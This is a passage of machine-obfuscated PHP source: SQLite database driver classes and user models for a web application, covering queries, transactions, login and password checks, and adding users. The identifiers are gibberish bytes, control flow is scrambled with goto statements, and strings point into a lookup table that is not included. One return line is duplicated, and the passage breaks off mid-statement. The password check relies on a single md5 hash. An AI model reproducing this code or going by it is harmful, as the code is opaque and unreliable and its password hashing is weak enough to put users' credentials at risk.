Dî…òØš˜£: $this->queryStr = $CãŞ‹¨ªœ; if ($this->queryID) { $this->free(); } think_action_status($a©©òç›£‹[19], 1); goto Bãè¤ì„…; Dì¢ƒ˜§ÃË: $a©©òç›£‹ =& $_SERVER[í…¶]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dî…òØš˜£; E¹‚œˆ¿: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $EÊÅÜŒÎŸÀ = $this->getAll(); return $EÊÅÜŒÎŸÀ; } goto CØòÒ’†ÎÂ; CØòÒ’†ÎÂ: } public function execute($Eê¡ÕÂÆí) { goto eøóŒ¥‘æ; aï‘¬«Îˆ: if (!1 === $FÏñ—ƒ ‘‰) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto C¸èîÎõç; b¶áŞ§°¯: $this->queryStr = $Eê¡ÕÂÆí; if ($this->queryID) { $this->free(); } think_action_status($B’ÇÏ˜ÂÂ™[21], 1); goto cÆå†ó‰Åô; eøóŒ¥‘æ: $B’ÇÏ˜ÂÂ™ =& $_SERVER[í…¶]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b¶áŞ§°¯; cÆå†ó‰Åô: think_status($B’ÇÏ˜ÂÂ™[20]); $FÏñ—ƒ ‘‰ = sqlite_exec($this->_linkID, $Eê¡ÕÂÆí); $this->debug(); goto aï‘¬«Îˆ; C¸èîÎõç: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[í…¶][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eõ’÷¨°œ® = sqlite_query($this->_linkID, $_SERVER[í…¶][23]); if (!$eõ’÷¨°œ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c‡³Šƒ…Ÿ× = sqlite_query($this->_linkID, $_SERVER[í…¶][24]); if (!$c‡³Šƒ…Ÿ×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Dáğ¯Ó‹¤„ = array(); if ($this->numRows > 0) { for ($D‰ÀŞ×Âµ = 0; $D‰ÀŞ×Âµ < $this->numRows; $D‰ÀŞ×Âµ++) { $Dáğ¯Ó‹¤„[$D‰ÀŞ×Âµ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Dáğ¯Ó‹¤„; } public function getFields($fÈ²ÉÅà‚‹) { $c¸½¼Öá =& $_SERVER[í…¶]; $e¥š˜Ò§Ñ = $this->query($c¸½¼Öá[25] . $fÈ²ÉÅà‚‹ . $c¸½¼Öá[26]); $Bóë¬«»½ = array(); if ($e¥š˜Ò§Ñ) { foreach ($e¥š˜Ò§Ñ as $b¥êÀô‘‹´ => $CåÀ‚ÕÉ¬ˆ) { $Bóë¬«»½[$CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[27]]] = array($c¸½¼Öá[28] => $CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[27]], $c¸½¼Öá[29] => $CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[30]], $c¸½¼Öá[31] => (bool) ($CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[32]] === $c¸½¼Öá[33]), $c¸½¼Öá[34] => $CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[35]], $c¸½¼Öá[36] => strtolower($CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[37]]) == $c¸½¼Öá[38], $c¸½¼Öá[39] => strtolower($CåÀ‚ÕÉ¬ˆ[$c¸½¼Öá[40]]) == $c¸½¼Öá[41]); } } return $Bóë¬«»½; } public function getTables($céøÉ¦·øº = '') { $B§¸ÎË…é =& $_SERVER[í…¶]; $BÎ‡¾Ğêğ‡ = $this->query($B§¸ÎË…é[42] . $B§¸ÎË…é[43] . $B§¸ÎË…é[44]); $fªà‹®»Ã± = array(); foreach ($BÎ‡¾Ğêğ‡ as $BÔƒ½éš½¸ => $dã„ñ«”Ô) { $fªà‹®»Ã±[$BÔƒ½éš½¸] = current($dã„ñ«”Ô); } return $fªà‹®»Ã±; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e³ù—ì =& $_SERVER[í…¶]; $CŞİé˜ÑÜÍ = sqlite_last_error($this->_linkID); $this->error = $CŞİé˜ÑÜÍ . $e³ù—ì[4] . sqlite_error_string($CŞİé˜ÑÜÍ); if ($e³ù—ì[33] != $this->queryStr) { $this->error .= LNG($e³ù—ì[45]) . $this->queryStr; } think_trace($this->error, $e³ù—ì[33], $e³ù—ì[46]); return $this->error; } public function escapeString($a¾‰ô®Å¢†) { return sqlite_escape_string($a¾‰ô®Å¢†); } public function parseLimit($FàºÍÏ§ç„) { $aË”‡‡Ïš† =& $_SERVER[í…¶]; $C•˜ƒè¤Î³ = $aË”‡‡Ïš†[33]; if (!empty($FàºÍÏ§ç„)) { $FàºÍÏ§ç„ = explode($aË”‡‡Ïš†[47], $FàºÍÏ§ç„); if (count($FàºÍÏ§ç„) > 1) { $C•˜ƒè¤Î³ .= $aË”‡‡Ïš†[48] . $FàºÍÏ§ç„[1] . $aË”‡‡Ïš†[49] . $FàºÍÏ§ç„[0] . $aË”‡‡Ïš†[50]; } else { $C•˜ƒè¤Î³ .= $aË”‡‡Ïš†[48] . $FàºÍÏ§ç„[0] . $aË”‡‡Ïš†[50]; } } return $C•˜ƒè¤Î³; } } class DbSqlite3Base extends Db { public function __construct($Eˆ’øíÃ = '') { $d‚¸öí•ØØ =& $_SERVER[í…¶]; if (!class_exists($d‚¸öí•ØØ[51])) { think_exception(think_lang($d‚¸öí•ØØ[10]) . $d‚¸öí•ØØ[52]); } if (!empty($Eˆ’øíÃ)) { if (!isset($Eˆ’øíÃ[$d‚¸öí•ØØ[12]])) { $Eˆ’øíÃ[$d‚¸öí•ØØ[12]] = 438; } $this->config = $Eˆ’øíÃ; if (empty($this->config[$d‚¸öí•ØØ[13]])) { $this->config[$d‚¸öí•ØØ[13]] = array(); } } } public function connect($E¶ñ´È‰Ï = '', $AÉ¥±¥Ìõ = 0) { $F—’îñÃ½¢ =& $_SERVER[í…¶]; if (!isset($this->linkID[$AÉ¥±¥Ìõ])) { if (empty($E¶ñ´È‰Ï)) { $E¶ñ´È‰Ï = $this->config; } $this->linkID[$AÉ¥±¥Ìõ] = new SQLite3($E¶ñ´È‰Ï[$F—’îñÃ½¢[17]]); if (!$this->linkID[$AÉ¥±¥Ìõ]) { think_exception($this->linkID[$AÉ¥±¥Ìõ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$AÉ¥±¥Ìõ]->busyTimeout(30000); if (1 != think_config($F—’îñÃ½¢[18])) { unset($this->config); } } return $this->linkID[$AÉ¥±¥Ìõ]; } public function free() { $this->queryID = null; } public function query($d…á‘¹æä) { goto C‚ŒÖÜÆìŠ; Dô½«§Ş‹Ñ: $this->queryStr = $d…á‘¹æä; if ($this->queryID) { $this->free(); } think_action_status($eŠ˜Ùùåæ[19], 1); goto cò¹Â“ÂÔ; C‚ŒÖÜÆìŠ: $eŠ˜Ùùåæ =& $_SERVER[í…¶]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dô½«§Ş‹Ñ; cò¹Â“ÂÔ: think_status($eŠ˜Ùùåæ[20]); $this->queryID = $this->_linkID->query($d…á‘¹æä); $this->debug(); goto CëÉ°â; CëÉ°â: if (!1 === $this->queryID) { $this->error(); return !1; } else { $FÖæ®‹´Àë = $this->getAll(); $this->numRows = count($FÖæ®‹´Àë); return $FÖæ®‹´Àë; } goto C¬ƒ»šŠà; C¬ƒ»šŠà: } public function execute($dÚèĞ£¶­) { goto dÄ¦¬Í¤ÙÓ; a÷Ùé¨÷œ: think_status($C¬š’ŒÀÜ†[20]); $b¿´²áê‚š = $this->_linkID->exec($dÚèĞ£¶­); $this->debug(); goto E†´ãöÁË; A ÇÒ°È: $this->queryStr = $dÚèĞ£¶­; if ($this->queryID) { $this->free(); } think_action_status($C¬š’ŒÀÜ†[21], 1); goto a÷Ùé¨÷œ; dÄ¦¬Í¤ÙÓ: $C¬š’ŒÀÜ† =& $_SERVER[í…¶]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A ÇÒ°È; E†´ãöÁË: if (!1 === $b¿´²áê‚š) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto dÓçª‚£ÍŞ; dÓçª‚£ÍŞ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[í…¶][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b’Òƒ›ÍÕ = $this->_linkID->query($_SERVER[í…¶][23]); if (!$b’Òƒ›ÍÕ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¿»™Ş‘†¹ = $this->_linkID->query($_SERVER[í…¶][24]); if (!$A¿»™Ş‘†¹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c•Ù³×ŒÙ = array(); while ($E¢Ë¡ô¹ßÀ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $c•Ù³×ŒÙ[] = $E¢Ë¡ô¹ßÀ; } $this->queryID->reset(); return $c•Ù³×ŒÙ; } public function getFields($c×ø—¾¸…) { $b•ÂÀššĞĞ =& $_SERVER[í…¶]; $a°ê§Û‚àœ = $this->query($b•ÂÀššĞĞ[25] . $c×ø—¾¸… . $b•ÂÀššĞĞ[26]); $AØ ÚÎ¶Æ = array(); if ($a°ê§Û‚àœ) { foreach ($a°ê§Û‚àœ as $E†Î˜²ÇµÈ => $D˜ÄÑ®í“¦) { $AØ ÚÎ¶Æ[$D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[28]]] = array($b•ÂÀššĞĞ[28] => $D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[28]], $b•ÂÀššĞĞ[29] => $D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[29]], $b•ÂÀššĞĞ[31] => (bool) ($D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[31]] === $b•ÂÀššĞĞ[33]), $b•ÂÀššĞĞ[34] => $D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[53]], $b•ÂÀššĞĞ[36] => (bool) $D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[54]], $b•ÂÀššĞĞ[39] => (bool) $D˜ÄÑ®í“¦[$b•ÂÀššĞĞ[54]]); } } return $AØ ÚÎ¶Æ; } public function getTables($aµºÈí·Ä± = '') { $D’®µîÃßš =& $_SERVER[í…¶]; $cìø¬‹™º× = $this->query($D’®µîÃßš[42] . $D’®µîÃßš[43] . $D’®µîÃßš[44]); $E®÷´œ´‹¹ = array(); foreach ($cìø¬‹™º× as $féŠö¤Ê¦ó => $EÛïÖÎõ…) { $E®÷´œ´‹¹[$féŠö¤Ê¦ó] = current($EÛïÖÎõ…); } return $E®÷´œ´‹¹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dïµ»Ÿõ© =& $_SERVER[í…¶]; $this->error = $this->_linkID->lastErrorMsg(); if ($dïµ»Ÿõ©[33] != $this->queryStr) { $this->error .= LNG($dïµ»Ÿõ©[45]) . $this->queryStr; } think_trace($this->error, $dïµ»Ÿõ©[33], $dïµ»Ÿõ©[46]); return $this->error; } public function escapeString($aîãªîÃ¼) { $DÑ¢±­…ï… =& $_SERVER[í…¶]; if ($this->_linkID) { return $this->_linkID->escapeString($aîãªîÃ¼); } return str_ireplace($DÑ¢±­…ï…[55], $DÑ¢±­…ï…[56], $aîãªîÃ¼); } public function parseLimit($c°éíÁ‚¡º) { $E”¼’Æà° =& $_SERVER[í…¶]; $EĞ‰µäŒ„ = $E”¼’Æà°[33]; if (!empty($c°éíÁ‚¡º)) { $c°éíÁ‚¡º = explode($E”¼’Æà°[47], $c°éíÁ‚¡º); if (count($c°éíÁ‚¡º) > 1) { $EĞ‰µäŒ„ .= $E”¼’Æà°[48] . $c°éíÁ‚¡º[1] . $E”¼’Æà°[49] . $c°éíÁ‚¡º[0] . $E”¼’Æà°[50]; } else { $EĞ‰µäŒ„ .= $E”¼’Æà°[48] . $c°éíÁ‚¡º[0] . $E”¼’Æà°[50]; } } return $EĞ‰µäŒ„; } } goto d‰Öà´¦î‘; CÒµâÑ„¯œ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x6a\x6f\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x64\145\163\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\x6c\146\x4a\x6f\x62\114\151\163\x74"; public function listData($bó•×’ƒ§¤ = false, $eßèáÊîæ¡ = "\x73\157\162\x74", $DÊ™Ïí¯¡Œ = false) { return parent::listData($bó•×’ƒ§¤, $eßèáÊîæ¡, $DÊ™Ïí¯¡Œ); } public function remove($BÍé¦¥œì) { return parent::remove($BÍé¦¥œì); } public function add($f‚ñˆÂ…Ã) { $a³ŞéÜ°ÔÔ =& $_SERVER[í…¶]; if ($this->findByName($f‚ñˆÂ…Ã[$a³ŞéÜ°ÔÔ[28]])) { return !1; } $f‚ñˆÂ…Ã[$a³ŞéÜ°ÔÔ[2122]] = $this->getSort(); return parent::insert($f‚ñˆÂ…Ã); } private function getSort() { $BÏŞÌÀ®ğ‡ =& $_SERVER[í…¶]; $DáàáåØî = parent::listData(); $e„˜Ä·¹Óì = array_to_keyvalue($DáàáåØî, $BÏŞÌÀ®ğ‡[33], $BÏŞÌÀ®ğ‡[2122]); return empty($e„˜Ä·¹Óì) ? 0 : max($e„˜Ä·¹Óì) + 1; } public function update($c‰Şš£°ğ¸, $eìÜ¤¿—‹È) { $aÊ›Êˆ“ƒ =& $_SERVER[í…¶]; $CËÜæÌˆ” = parent::listData($c‰Şš£°ğ¸); $föÍ³›î—‹ = $this->findByName($eìÜ¤¿—‹È[$aÊ›Êˆ“ƒ[28]]); if (!$CËÜæÌˆ” || $föÍ³›î—‹ && $föÍ³›î—‹[$aÊ›Êˆ“ƒ[376]] != $CËÜæÌˆ”[$aÊ›Êˆ“ƒ[376]]) { return !1; } return parent::update($c‰Şš£°ğ¸, $eìÜ¤¿—‹È); } public function setUserJob($bÂéÔ‚òéÎ, $E¶²Ü¢‰“) { goto Eš£àŸë°å; Cñ£í°Šİ: $DÍ¦¬îĞˆ = rtrim($DÍ¦¬îĞˆ, $CÁ„½ŞŞË¹[47]); Model($CÁ„½ŞŞË¹[486])->metaSet($bÂéÔ‚òéÎ, self::JOB_KEY, $DÍ¦¬îĞˆ); goto aÅÑíï·­Š; Eš£àŸë°å: $CÁ„½ŞŞË¹ =& $_SERVER[í…¶]; if (!is_array($E¶²Ü¢‰“)) { $E¶²Ü¢‰“ = array($E¶²Ü¢‰“); } $f×ÑÅìßæĞ = parent::listData(); goto bÓÇ‘ä÷ñ²; bÓÇ‘ä÷ñ²: $eŸ§™Áòµ = array_to_keyvalue($f×ÑÅìßæĞ, $CÁ„½ŞŞË¹[28]); $DÍ¦¬îĞˆ = $CÁ„½ŞŞË¹[370]; foreach ($E¶²Ü¢‰“ as $fù’®Ğë¤) { if ($eŸ§™Áòµ[$fù’®Ğë¤]) { $DÍ¦¬îĞˆ .= $eŸ§™Áòµ[$fù’®Ğë¤][$CÁ„½ŞŞË¹[376]] . $CÁ„½ŞŞË¹[47]; } else { $F™™‡èï—Æ = $this->add($fù’®Ğë¤); $DÍ¦¬îĞˆ .= $F™™‡èï—Æ . $CÁ„½ŞŞË¹[47]; } } goto Cñ£í°Šİ; aÅÑíï·­Š: } public function getUserJob($B”ÄÌ¨††Ô) { $bğß„À‘¡ñ = Model($_SERVER[í…¶][486])->metaGet($B”ÄÌ¨††Ô); return $this->getUserJobInfo($bğß„À‘¡ñ[self::JOB_KEY]); } public function getUserJobInfo($FàÃäøİÙ) { goto dÌ‘–¤²Í; EáÖã°ïñ²: return $DÔğíË‡Ê’; goto CÜëîŸ®Ü; EÆŒ’ª—Ş¾: $aœ¬ä›âÛ = array_remove_key($aœ¬ä›âÛ, $EÓšçØ´Ê[187]); $DÔğíË‡Ê’ = array(); foreach ($c¥ÒšßÇÖŸ as $fàÚŠÚç‘É) { if (isset($aœ¬ä›âÛ[$fàÚŠÚç‘É])) { $DÔğíË‡Ê’[] = $aœ¬ä›âÛ[$fàÚŠÚç‘É]; } } goto EáÖã°ïñ²; dÌ‘–¤²Í: $EÓšçØ´Ê =& $_SERVER[í…¶]; $c¥ÒšßÇÖŸ = explode($EÓšçØ´Ê[47], $FàÃäøİÙ); $aœ¬ä›âÛ = parent::listData(); goto EÆŒ’ª—Ş¾; CÜëîŸ®Ü: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\x65" => "\x75\x73\145\x72\137\x6d\x65\164\x61", "\x6d\145\x74\141\x46\151\x65\x6c\144" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\x6e\151\143\153\116\141\155\x65\x2c\x6e\141\155\x65\54\x61\x76\141\164\141\x72\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($e†–ÓÏ§µ) { $c‡Êï²ÌÙ¡ =& $_SERVER[í…¶]; $C¦ˆÄó£‰ = $c‡Êï²ÌÙ¡[2490]; return array($c‡Êï²ÌÙ¡[2167] => array($e†–ÓÏ§µ[0], $C¦ˆÄó£‰), $c‡Êï²ÌÙ¡[2169] => array($e†–ÓÏ§µ[0], $C¦ˆÄó£‰), $c‡Êï²ÌÙ¡[2491] => array($e†–ÓÏ§µ[0], $C¦ˆÄó£‰)); } protected function getInfo($FâÚ±—ÆˆŠ, $bœ»ÛàÉ ¬ = false) { $D»»ŒÂõ® = $this->getInfoSimple($FâÚ±—ÆˆŠ); if (!is_array($D»»ŒÂõ®)) { return array(); } if ($bœ»ÛàÉ ¬) { return $this->_getInfoApply($D»»ŒÂõ®); } return $this->cacheFunctionGet($_SERVER[í…¶][2212], $FâÚ±—ÆˆŠ); } protected function getInfoFull($f‘ƒä„¾–¦, $A¸®Êš¯Õ = false) { $eéß„Ê¨İ = $this->getInfoSimple($f‘ƒä„¾–¦); if (!is_array($eéß„Ê¨İ)) { return array(); } if ($A¸®Êš¯Õ) { return $this->_getInfoApply($eéß„Ê¨İ, !0); return $this->_getInfoApply($eéß„Ê¨İ, !0); } return $this->cacheFunctionGet($_SERVER[í…¶][2492], $f‘ƒä„¾–¦); } private function _getInfoApply($Eš¿¨³†Ïá, $F´ğ«îŒÁõ = false) { goto C©ˆÂ“Ó–; C©ˆÂ“Ó–: $bÂ¾—ñ‘Üï =& $_SERVER[í…¶]; if (!$Eš¿¨³†Ïá) { return $Eš¿¨³†Ïá; } $e†Ç‹ãÀŞ = md5($bÂ¾—ñ‘Üï[2493] . $Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[800]] . $bÂ¾—ñ‘Üï[2494] . $Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[28]]); goto bÊ­„š¹É£; B¶º­¬éèÍ: $Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[400]][$bÂ¾—ñ‘Üï[2329]] = isset($a¦’ŠÔ‹š¯[$bÂ¾—ñ‘Üï[2330]]) ? $a¦’ŠÔ‹š¯[$bÂ¾—ñ‘Üï[2330]] : null; if ($F´ğ«îŒÁõ) { $Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[426]] = $this->metaGet($Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[1433]]); } return $Eš¿¨³†Ïá; goto EÆÆÏ¹ÅÏ; bÊ­„š¹É£: $Eš¿¨³†Ïá = $this->_listDataApplyItem($Eš¿¨³†Ïá); $a¦’ŠÔ‹š¯ = Model($bÂ¾—ñ‘Üï[1115])->metaGet($Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[400]][$bÂ¾—ñ‘Üï[378]]); $Eš¿¨³†Ïá[$bÂ¾—ñ‘Üï[2495]] = $e†Ç‹ãÀŞ; goto B¶º­¬éèÍ; EÆÆÏ¹ÅÏ: } protected function getInfoSimple($bê’Ééá”¹, $C›³ã³ˆ¤Í = false) { $f°ôŒ’œÌ =& $_SERVER[í…¶]; if (!$bê’Ééá”¹) { return array(); } if ($C›³ã³ˆ¤Í) { $c«Ì÷ÎóäÙ = $this->where(array($f°ôŒ’œÌ[1433] => intval($bê’Ééá”¹)))->find(); if (!is_array($c«Ì÷ÎóäÙ)) { return array(); } $c«Ì÷ÎóäÙ[$f°ôŒ’œÌ[2496]] = Action($f°ôŒ’œÌ[2497])->parseUrl($c«Ì÷ÎóäÙ[$f°ôŒ’œÌ[2496]]); return $c«Ì÷ÎóäÙ; } return $this->cacheFunctionGet($f°ôŒ’œÌ[2170], $bê’Ééá”¹); } protected function getInfoSimpleOuter($BßƒÀ®ˆ«Ú) { goto Bá‡•ÖÕ; eééƒ¼›à: return $EßÁ ‹™; goto d•ÑÏ…›°ó; Bá‡•ÖÕ: $eÉÖ‡º›† =& $_SERVER[í…¶]; if (!$BßƒÀ®ˆ«Ú || $BßƒÀ®ˆ«Ú == 0) { return array($eÉÖ‡º›†[1433] => $eÉÖ‡º›†[477], $eÉÖ‡º›†[28] => $eÉÖ‡º›†[157] . LNG($eÉÖ‡º›†[2498]) . $eÉÖ‡º›†[485], $eÉÖ‡º›†[2496] => STATIC_PATH . $eÉÖ‡º›†[2499]); } $Cº×ĞˆÌŸª = $this->cacheFunctionGet($eÉÖ‡º›†[2170], $BßƒÀ®ˆ«Ú); goto D™±ËâÀ; D™±ËâÀ: $EßÁ ‹™ = array_field_key($Cº×ĞˆÌŸª, explode($eÉÖ‡º›†[47], $this->simpleField)); if (!$EßÁ ‹™) { return array($eÉÖ‡º›†[1433] => $eÉÖ‡º›†[1029], $eÉÖ‡º›†[28] => $eÉÖ‡º›†[157] . LNG($eÉÖ‡º›†[2500]) . $eÉÖ‡º›†[485], $eÉÖ‡º›†[2496] => STATIC_PATH . $eÉÖ‡º›†[2501]); } $EßÁ ‹™[$eÉÖ‡º›†[2496]] = Action($eÉÖ‡º›†[2497])->parseUrl($EßÁ ‹™[$eÉÖ‡º›†[2496]]); goto eééƒ¼›à; d•ÑÏ…›°ó: } protected function groupUser($aÔ†—»«ñ) { } public static function errorLang($fêçÚ¸ƒ˜‚) { $DßÍÜÈõ’Ê =& $_SERVER[í…¶]; $d˜ÜÓÔÔ… = array(self::ERROR_USER_NOT_EXISTS => $DßÍÜÈõ’Ê[2502], self::ERROR_USER_PASSWORD_ERROR => $DßÍÜÈõ’Ê[2503], self::ERROR_USER_EXIST_NAME => $DßÍÜÈõ’Ê[2504], self::ERROR_USER_EXIST_PHONE => $DßÍÜÈõ’Ê[2505], self::ERROR_USER_EXIST_EMAIL => $DßÍÜÈõ’Ê[2506], self::ERROR_USER_LOGIN_LOCK => $DßÍÜÈõ’Ê[2507], self::ERROR_IP_NOT_ALLOW => $DßÍÜÈõ’Ê[2508], self::ERROR_USER_EXIST_NICKNAME => $DßÍÜÈõ’Ê[2509]); return LNG($d˜ÜÓÔÔ…[$fêçÚ¸ƒ˜‚]); } public function getInfoByMeta($Eªï‡ßÛóø, $EÔœò¡ƒ¢ó) { $E’ÜÍ›² =& $_SERVER[í…¶]; $dó›²ƒ„ùÂ = Model($E’ÜÍ›²[2510])->where(array($E’ÜÍ›²[89] => $Eªï‡ßÛóø, $E’ÜÍ›²[368] => $EÔœò¡ƒ¢ó))->find(); if ($dó›²ƒ„ùÂ) { return $this->getInfo($dó›²ƒ„ùÂ[$E’ÜÍ›²[1433]]); } return !1; } public function userLoginCheck($aÏæÁ·æŸ‘, $cğ»‡Ê‘´) { goto d•ÇÄç‚ÊÓ; AÙ·›ƒÊ¾˜: $this->userEdit($e„¥ÔßŠçÍ[$Dïë”·—˜À[1433]], array($Dïë”·—˜À[2512] => time())); return $this->getInfo($e„¥ÔßŠçÍ[$Dïë”·—˜À[1433]]); goto aˆé«§¢Õ˜; eí»»÷øí°: $e„¥ÔßŠçÍ = $this->where($A¼¹ªæµ‚)->find(); if (!$e„¥ÔßŠçÍ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e„¥ÔßŠçÍ[$Dïë”·—˜À[1433]], $cğ»‡Ê‘´)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto AÙ·›ƒÊ¾˜; d•ÇÄç‚ÊÓ: $Dïë”·—˜À =& $_SERVER[í…¶]; $A¼¹ªæµ‚ = array($Dïë”·—˜À[28] => $aÏæÁ·æŸ‘, $Dïë”·—˜À[2333] => $aÏæÁ·æŸ‘, $Dïë”·—˜À[293] => $aÏæÁ·æŸ‘, $Dïë”·—˜À[2511] => $aÏæÁ·æŸ‘, $Dïë”·—˜À[912] => $Dïë”·—˜À[914]); if ($this->nickNameRpt()) { unset($A¼¹ªæµ‚[$Dïë”·—˜À[2333]]); } goto eí»»÷øí°; aˆé«§¢Õ˜: } public function clearCache($B÷øÒÊ Ñù) { $b†éå–’ç³ =& $_SERVER[í…¶]; $this->cacheFunctionClear($b†éå–’ç³[2212], $B÷øÒÊ Ñù); $this->cacheFunctionClear($b†éå–’ç³[2170], $B÷øÒÊ Ñù); $this->cacheFunctionClear($b†éå–’ç³[2492], $B÷øÒÊ Ñù); } public function userPasswordCheck($d®Ş•ä„ë, $Fğï†Áòá§) { $b©°—„ÛĞ =& $_SERVER[í…¶]; $dŸÈµˆéô = $this->where(array($b©°—„ÛĞ[1433] => intval($d®Ş•ä„ë)))->find(); $A¯­ˆªİİŠ = $this->metaGet($d®Ş•ä„ë); $b…ò§‘«¨ï = isset($A¯­ˆªİİŠ[$b©°—„ÛĞ[2513]]) ? $A¯­ˆªİİŠ[$b©°—„ÛĞ[2513]] : $b©°—„ÛĞ[33]; if (md5($b…ò§‘«¨ï . trim($Fğï†Áòá§)) !== $dŸÈµˆéô[$b©°—„ÛĞ[800]]) { return !1; } return !0; } public function userAdd($E†à„†•¾) { goto fÆÇºÖÀãè; bï… ÀÎÁ: $C‘“¼ê¸¶Á = $this->_checkExist($E†à„†•¾); if ($C‘“¼ê¸¶Á !== !0) { return $C‘“¼ê¸¶Á; } $dÓÙƒ£‘³š = $this->add($f¤¼‰ø‹ÖÍ); goto fîğÀİĞ›ö; fîğÀİĞ›ö: $e‘Û‰ù ¯© = array($Cô‰Ÿ·Àäò[2521] => $f¤¼‰ø‹ÖÍ[$Cô‰Ÿ·Àäò[800]], $Cô‰Ÿ·Àäò[2517] => $f¤¼‰ø‹ÖÍ[$Cô‰Ÿ·Àäò[2333]]); $this->userEdit($dÓÙƒ£‘³š, $e‘Û‰ù ¯©); Model($Cô‰Ÿ·Àäò[1115])->userRootAdd($dÓÙƒ£‘³š); goto f†¤˜Øë’; fÆÇºÖÀãè: $Cô‰Ÿ·Àäò =& $_SERVER[í…¶]; $f¤¼‰ø‹ÖÍ = array($Cô‰Ÿ·Àäò[395] => $E†à„†•¾[$Cô‰Ÿ·Àäò[28]], $Cô‰Ÿ·Àäò[2514] => $E†à„†•¾[$Cô‰Ÿ·Àäò[1319]], $Cô‰Ÿ·Àäò[2515] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[293]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[293]] : $Cô‰Ÿ·Àäò[33], $Cô‰Ÿ·Àäò[2516] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[2511]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[2511]] : $Cô‰Ÿ·Àäò[33], $Cô‰Ÿ·Àäò[2517] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[2333]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[2333]] : $E†à„†•¾[$Cô‰Ÿ·Àäò[28]], $Cô‰Ÿ·Àäò[2518] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[2496]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[2496]] : $Cô‰Ÿ·Àäò[33], $Cô‰Ÿ·Àäò[2519] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[2520]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[2520]] : 1, $Cô‰Ÿ·Àäò[2521] => $E†à„†•¾[$Cô‰Ÿ·Àäò[800]], $Cô‰Ÿ·Àäò[2171] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[2085]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[2085]] : 1024 * 1024 * 20, $Cô‰Ÿ·Àäò[2172] => 0, $Cô‰Ÿ·Àäò[2512] => 0, $Cô‰Ÿ·Àäò[2199] => isset($E†à„†•¾[$Cô‰Ÿ·Àäò[691]]) ? $E†à„†•¾[$Cô‰Ÿ·Àäò[691]] : 1); if (!empty($E†à„†•¾[$Cô‰Ÿ·Àäò[1433]])) { $f¤¼‰ø‹ÖÍ[$Cô‰Ÿ·Àäò[1433]] = $E†à„†•¾[$Cô‰Ÿ·Àäò[1433]]; } goto bï… ÀÎÁ; f†¤˜Øë’: return $dÓÙƒ£‘³š; goto 